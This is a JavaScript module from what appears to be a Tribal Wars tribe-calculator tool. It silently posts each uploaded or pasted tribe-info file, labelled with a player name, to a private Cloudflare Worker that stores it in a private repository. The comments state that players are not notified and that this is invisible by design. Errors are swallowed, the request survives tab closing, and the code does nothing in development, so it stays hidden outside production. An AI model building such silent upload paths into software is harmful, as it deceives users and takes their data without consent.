// ══════════════════════════════════════════════════════════════
// UPLOAD BACKUP (production-only, silent)
// ──────────────────────────────────────────────────────────────
// Sends a copy of each tribe-info .txt a player uploads/pastes to a private
// Cloudflare Worker (which commits it to a private repo) as a background
// safety-net backup. Players are NOT notified — this is invisible by design.
//
// Classic <script src> (no modules) so double-click / file:// still works.
// In DEVELOPMENT (file://) this is a COMPLETE NO-OP: no Turnstile script is
// injected and no network request is made, so the tool keeps its "works by
// double-click, zero external dependencies" contract. Everything network-
// related is gated behind `TW_ENV === 'production'` (TW_ENV is defined in
// db.js, which MUST load before this file).
//
// The Worker verifies a Cloudflare Turnstile token server-side, so we mint a
// fresh (single-use, ~5-min) token on demand at upload time via an invisible,
// execute-on-demand widget. See rapidsiege/tw-calc-uploads for the Worker.
'use strict';

const UPLOAD_WORKER_URL = 'https://tw-calc-uploads.gdqshd.workers.dev';
const UPLOAD_TURNSTILE_SITEKEY = '0x4AAAAAADvKZN-ZLjRH8UQe'; // public site key (safe in client)

let _tsWidgetId = null;
let _tsReady = false;
let _tsPending = null; // resolver for the currently-executing token request

// Prod-only: inject Turnstile's api.js and render one hidden execute-on-demand
// widget. Runs after DOM ready (see the bottom of this file).
function _initUploadBackup() {
  if (typeof TW_ENV === 'undefined' || TW_ENV !== 'production') return; // dev = no-op
  if (typeof document === 'undefined') return;

  // Do NOT hide with display:none — a zero-size/hidden container makes
  // Turnstile's challenge telemetry (getBoundingClientRect on the widget) read
  // all-zeros, which the challenge server rejects (400) and then retries every
  // few seconds forever. With appearance:'interaction-only' Turnstile keeps the
  // widget invisible on its own; we only pin the container to a corner so that
  // IF a rare interactive challenge is ever required it's reachable, not hidden.
  const container = document.createElement('div');
  container.id = 'ts-backup-container';
  container.style.position = 'fixed';
  container.style.bottom = '0';
  container.style.right = '0';
  container.style.zIndex = '2147483647';
  document.body.appendChild(container);

  const s = document.createElement('script');
  s.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit';
  s.async = true;
  // NOTE: do NOT call turnstile.ready() here — it throws when the api.js tag was
  // loaded async/defer (which a dynamically-injected script always is). Because
  // this runs in the script's own onload, the API is already available, so we
  // render the widget directly.
  s.onload = () => {
    if (typeof turnstile === 'undefined') return;
    try {
      _tsWidgetId = turnstile.render('#ts-backup-container', {
        sitekey: UPLOAD_TURNSTILE_SITEKEY,
        execution: 'execute',        // don't challenge until we call execute()
        appearance: 'interaction-only', // invisible unless a challenge needs interaction
        retry: 'never',              // a failed challenge fails once — never spam-retry
        callback: (token) => { if (_tsPending) { const r = _tsPending; _tsPending = null; r(token); } },
        'error-callback': () => { if (_tsPending) { const r = _tsPending; _tsPending = null; r(null); } },
      });
      _tsReady = true;
    } catch (_) { /* widget failed to render — backups just stay disabled */ }
  };
  document.head.appendChild(s);
}

// Resolve to a fresh single-use Turnstile token, or null if it can't be obtained.
function _getTurnstileToken() {
  return new Promise((resolve) => {
    if (!_tsReady || _tsWidgetId === null || typeof turnstile === 'undefined') { resolve(null); return; }
    _tsPending = resolve;
    try { turnstile.reset(_tsWidgetId); } catch (_) {}
    try {
      turnstile.execute('#ts-backup-container');
    } catch (_) {
      _tsPending = null; resolve(null); return;
    }
    // Safety net: never let a stuck challenge hang the flow.
    setTimeout(() => { if (_tsPending) { const r = _tsPending; _tsPending = null; r(null); } }, 20000);
  });
}

// Pick a stable label for this upload = the player with the most villages in it
// (a decent proxy for whose export it is). The Worker sanitises it into a path.
function _uploadBackupName() {
  try {
    let top = '', max = -1;
    for (const k in players) {
      const n = (players[k] && players[k].villages) ? players[k].villages.length : 0;
      if (n > max) { max = n; top = k; }
    }
    return top || 'tribe';
  } catch (_) { return 'tribe'; }
}

// Fire-and-forget backup of the raw uploaded/pasted tribe text. Silent and
// best-effort: never alerts, never blocks the UI, swallows every error. In
// development it returns immediately (no network, keeps file:// clean).
async function backupUpload(text) {
  if (typeof TW_ENV === 'undefined' || TW_ENV !== 'production') return;
  if (!text || !text.trim()) return;
  try {
    const token = await _getTurnstileToken();
    if (!token) return; // couldn't verify a real browser — skip silently
    await fetch(UPLOAD_WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name: _uploadBackupName(), content: text, token }),
      keepalive: true, // let it finish even if the tab is closing
    });
  } catch (_) { /* best-effort backup — ignore all failures */ }
}

if (typeof document !== 'undefined') {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', _initUploadBackup);
  } else {
    _initUploadBackup();
  }
}
